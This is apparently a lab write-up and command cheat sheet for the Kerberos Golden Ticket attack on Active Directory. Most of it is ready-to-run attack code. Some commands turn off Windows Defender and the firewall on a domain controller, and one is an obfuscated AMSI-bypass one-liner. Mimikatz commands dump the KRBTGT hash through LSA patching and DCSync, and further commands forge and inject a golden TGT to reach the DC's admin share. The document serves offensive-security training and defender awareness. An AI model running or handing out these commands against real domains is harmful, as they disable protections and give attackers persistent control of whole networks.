# Golden Ticket Attack Overview

Golden Ticket attacks can be carried out against Active Directory domains, where access control is implemented using Kerberos tickets issued to authenticated users by a Key Distribution Service. The attacker gains control over the domain’s Key Distribution Service account (KRBTGT account) by stealing its NTLM hash. This allows the attacker to generate Ticket Granting Tickets (TGTs) for any account in the Active Directory domain. With valid TGTs, the attacker can request access to any resource/system on its domain from the Ticket Granting Service (TGS).

Because the attacker controls the component of the access control system responsible for issuing TGTs, they have the golden ticket to access any resource on the domain. This is a persistent attack, not merely privilege escalation. It assumes domain admin rights, as this is necessary for the attack to succeed.

## Prerequisites
```powershell
. .\Powerview.ps1
Get-DomainUser -SamAccountName Administrator
```

### Do Over the Pass Hash with a User with Access to the DC

### Execute Mimikatz on DC as Domain Admin to Get KRBTGT Hash
```powershell
$sess = New-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local

# Disable Firewall and AV
Invoke-Command -ScriptBlock{Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-Command -ScriptBlock{netsh advfirewall set allprofiles state off} -Session $sess
Invoke-Command -Session $sess -FilePath c:\AD\Tools\Invoke-mimikatz.ps1

# Enter Session
Enter-PSSession $sess

# Bypass AMSI
powershell -ep bypass
SET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Get all the hashes including the important krbtgt hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```
![image](https://github.com/user-attachments/assets/fb84673c-9338-4643-811f-03ef7e92b093)

![image](https://github.com/user-attachments/assets/49537006-f49b-46f7-b990-7ef1aa7cbd83)

### Another Way to Get KRBTGT Hash Silently

The DCSync is a Mimikatz feature that tries to impersonate a domain controller and request account password information from the targeted domain controller. This technique is less noisy as it doesn’t require direct access to the domain controller or retrieving the NTDS.DIT file over the network.
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:pentesting\krbtgt"'
```
![image](https://github.com/user-attachments/assets/ff65f1fb-5162-46b1-bbb2-fc01f543cd46)

## Golden Ticket Attack Execution

With the KRBTGT hash, perform the Golden Ticket attack from any machine.
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:513 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
klist
ls \\dcorp-dc\c$
cd \\dcorp-dc\c$
```
![image](https://github.com/user-attachments/assets/9c9a681e-cd4d-411f-b029-4313bda7d6e9)

![image](https://github.com/user-attachments/assets/550fc38d-85f8-440f-b3b6-1ffdc3b5ee05)

![image](https://github.com/user-attachments/assets/83ee0a15-71a9-4e45-ab49-a39a62de0f28)

![image](https://github.com/user-attachments/assets/70ef17df-a269-469b-ab5a-00e30fff061c)

## Persistence and Privilege Escalation with Golden Kerberos Tickets

This lab explores an attack on Active Directory Kerberos Authentication. Specifically, it focuses on an attack that forges Kerberos Ticket Granting Tickets (TGTs) used to authenticate users with Kerberos. TGTs are used when requesting Ticket Granting Service (TGS) tickets, meaning a forged TGT can get any TGS ticket.

### Execution
#### Extracting the krbtgt Account's Password NTLM Hash
```powershell
mimikatz# lsadump::lsa/inject /name:krbtgt
```
![image](https://github.com/user-attachments/assets/b53c68e4-a9e6-4f71-b841-398db63df276)

#### Creating a Forged Golden Ticket
```powershell
mimikatz# kerberos::golden /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /rc4:8584cfccd24f6a7f49ee56355d41bd30 /user:newAdmin /id:500 /ptt
```

### Observations

#### Checking if the Ticket Got Created

Open another PowerShell console with a low-privileged account and try to mount a c$ share of pc-mantvydas and dc-mantvydas. If access is denied, switch back to the console used to create the Golden Ticket (local admin) and attempt to access the c$ share of the domain controller again. This time, it should succeed.

## References
- [Complete Domain Compromise with Golden Tickets](https://blog.stealthbits.com/complete-domain-compromise-with-golden-tickets/)
- [ADSecurity: Golden Tickets](https://adsecurity.org/?p=1515)
```
